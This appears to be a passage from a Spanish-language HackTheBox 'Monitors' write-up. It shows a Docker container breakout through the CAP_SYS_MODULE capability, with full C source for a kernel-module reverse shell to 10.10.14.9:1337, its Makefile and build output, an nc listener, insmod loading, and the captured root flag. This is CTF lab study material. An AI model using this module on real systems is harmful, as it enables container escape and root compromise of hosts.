LABEL                              PID TTY          TIME CMD
docker-default (enforce)           167 ?        00:00:00 shell.sh
...
```
identificamos que estamos dentro de un contenedor Docker. 
```
root@a3879984685b:/bin# capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=

```
Logramos listar las capacidades del usuario en el entorno de  contenedor de Docker, la capacidad más relevante de interés es CAP_SYS_MODULE (Control System Module), una capacidad de Linux que otorga a un proceso el privilegio de administrar la carga y descarga de módulos del kernel del sistema operativo. 

[capabilities.7.html](https://man7.org/linux/man-pages/man7/capabilities.7.html){:target="_blank"}
```powershell
CAP_SYS_MODULE
              •  Load and unload kernel modules (see init_module(2) and
                 delete_module(2));
              •  before Linux 2.6.25: drop capabilities from the system-
                 wide capability bounding set.
```

Los módulos del kernel son fragmentos de código que pueden cargarse y descargarse dinámicamente en el kernel del sistema operativo para proporcionar funcionalidades adicionales o controladores para dispositivos.

Lo que haremos a continuación es agregar nuestra revershell al sistema como si fuera un módulo del kernel, aprovechando nuestra capabilidad de 'cap_sys_module.'

<span style="color: blue;">Fuentes:</span>
[container-breakouts-part2/](https://blog.nody.cc/posts/container-breakouts-part2/){:target="_blank"} ,
[abusing-sys-module-capability](https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd){:target="_blank"}

Una vez se cargue el módulo en el kernel, se enviará la revershell automaticamente a nuestro listener.

```c
root@f89953eb655c:/tmp# vi reverse-shell.c
root@f89953eb655c:/tmp# cat reverse-shell.c 
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");
char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.9/1337 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}
module_init(reverse_shell_init);
module_exit(reverse_shell_exit);

```
Este Makefile se utiliza para compilar nuestro módulo custom de kernel de Linux.

```bash
root@f89953eb655c:/tmp# vi makefile
root@f89953eb655c:/tmp# cat makefile

obj-m +=reverse-shell.o
all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
```
root@f89953eb655c:/tmp# make
make -C /lib/modules/4.15.0-151-generic/build M=/tmp modules
make[1]: Entering directory '/usr/src/linux-headers-4.15.0-151-generic'
  CC [M]  /tmp/reverse-shell.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /tmp/reverse-shell.mod.o
  LD [M]  /tmp/reverse-shell.ko
make[1]: Leaving directory '/usr/src/linux-headers-4.15.0-151-generic'

```
```
root@f89953eb655c:/tmp# ls
Makefile	modules.order	 reverse-shell.ko     reverse-shell.mod.o
Module.symvers	reverse-shell.c  reverse-shell.mod.c  reverse-shell.o
```
El archivo que nos interesa ahora es "reverse-shell.ko"

```bash
sudo nc -lnvp 1337
```
El comando "insmod reverse-shell.ko" se utiliza para cargar el módulo "reverse-shell.ko" que hemos creado en el kernel del sistema
```
root@f89953eb655c:/tmp# insmod reverse-shell.ko 
```

```bash
┌─[ot3ro@parrot]─[~/HTB/Monitors]
└──╼ $sudo nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.238] 43972
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
root@monitors:/# 
root@monitors:/# cd /root                                
root@monitors:/root# ls -l
-r-------- 1 root root 33 Oct 14 02:41 root.txt
root@monitors:/root# cat root.txt
6e043611cf3dd906c06982e09596caf5

```
Y hemos logrado obtener la flag root.txt
